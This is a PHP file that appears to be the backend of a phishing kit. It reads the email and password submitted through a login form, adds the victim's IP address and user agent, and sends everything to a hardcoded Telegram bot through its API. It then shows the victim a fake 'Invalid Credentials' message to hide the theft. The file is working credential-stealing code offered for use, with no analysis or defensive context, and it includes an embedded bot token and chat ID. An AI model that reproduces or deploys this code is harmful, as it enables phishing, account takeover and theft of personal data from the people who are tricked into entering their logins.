<?php

$botToken = "6916318432:AAHgSvjriyk81nzU7A9_xdVZPdjwPStGUog";
$chatId = "6141761682";

$email = trim($_POST['email']);
$password = trim($_POST['password']);
$detail = trim($_POST['detail']);

if ($email && $password) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $message = "[--+🏦  ".$detail." 🏦--+]\n\n";
    $message .= " 👤  EMAIL :      " . $email . "   \n";
    $message .= " 👤  PASSWORD :      " . $password . "   \n\n";
    $message .= "|--- I N F O | I P ---|\n";
    $message .= " Client IP: " . $ip . "  \n";
    $message .= " User Agent : " . $useragent . "   \n";

    $website = "https://api.telegram.org/bot" . $botToken;
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);

    // Check for cURL errors
    if ($result === false) {
        $error = curl_error($ch);
        error_log("cURL Error: " . $error);
        echo json_encode([
            'signal' => 'bad',
            'msg' => 'Telegram request failed: ' . $error
        ]);
    } else {
        $signal = 'ok';
        $msg = 'Invalid Credentials'; // This can be updated to your preferred success message
        echo json_encode([
            'signal' => $signal,
            'msg' => $msg
        ]);
    }

    curl_close($ch);
} else {
    $signal = 'bad';
    $msg = 'Please fill in all the fields.';
    echo json_encode([
        'signal' => $signal,
        'msg' => $msg
    ]);
}
